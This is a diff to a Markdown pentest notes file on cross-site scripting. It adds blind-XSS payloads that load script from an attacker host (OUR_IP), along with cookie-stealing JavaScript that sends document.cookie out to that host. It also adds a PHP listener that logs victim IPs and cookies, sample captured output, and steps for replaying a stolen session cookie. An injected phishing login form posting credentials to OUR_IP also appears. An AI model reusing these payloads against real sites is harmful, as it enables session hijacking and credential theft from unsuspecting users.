@@ -13,6 +13,68 @@ Manually test payloads against input fields
 ### Code Review
 Review the source code for the page and the JS in Developer Tools
 
+## Session Hijacking (Stealing Session Cookie)
+### Blind XSS Detection
+Use a payload that will send a request back to our webserver
+Payloads:
+```html
+<script src="http://OUR_IP/script.js"></script>
+```
+Change the script name to the filed we are testing
+```html
+<script src="http://OUR_IP/username"></script>
+```
+If we get a request for /username, then we know that field is vulnerable
+
+Examples from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)
+```html
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
+### The Session Hijack
+We need code to send the session cookie back to our listener(nc or php(same as above))
+More Examples from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)```javascript
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+We can host the malicious JS as well...
+Put the malicious code in a file called script.js
+```javascript
+new Image().src='http://OUR_IP/index.php?c='+document.cookie
+```
+Then you can inject the following:
+```html
+<script src=http://OUR_IP/script.js></script>
+```
+It's possible we might get multiple cookie values. Change the php code to the following to save them to a file:
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+Sample result:
+```bash
+10.10.10.10:52798 [200]: /script.js
+10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
+```
+Finally we can use the cookie on the login page to login.
+Navigate to the page
+Open developer tools
+Storage tab
+Click '+' to add cookie (Name is the part before the '=' and value is the part after)
+
 ## Phishing (Fake Login Form)
 ### Login form Injection
 ```html
@@ -26,6 +88,13 @@ Review the source code for the page and the JS in Developer Tools
 Login form minified and inserted into document.write parameter
 ```javascript
 document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+
+### Cleanup
+Remove unwanted fields with the using document.getElementByID().remove() function
+Find the "id="x" in the form to be removed. (x = 'urlform' in the below example
+```javascript
+document.getElementById('urlform').remove();
 ```
 
 Completed script example
@@ -59,12 +128,6 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 Start the php listener
 ```bash
 sudo php -s 0.0.0.0:80
-```
-### Cleanup
-Remove unwanted fields with the using document.getElementByID().remove() function
-Find the "id="x" in the form to be removed. (x = 'urlform' in the below example
-```javascript
-document.getElementById('urlform').remove();
 ```
 ## Defacing
 ### Changing the Background
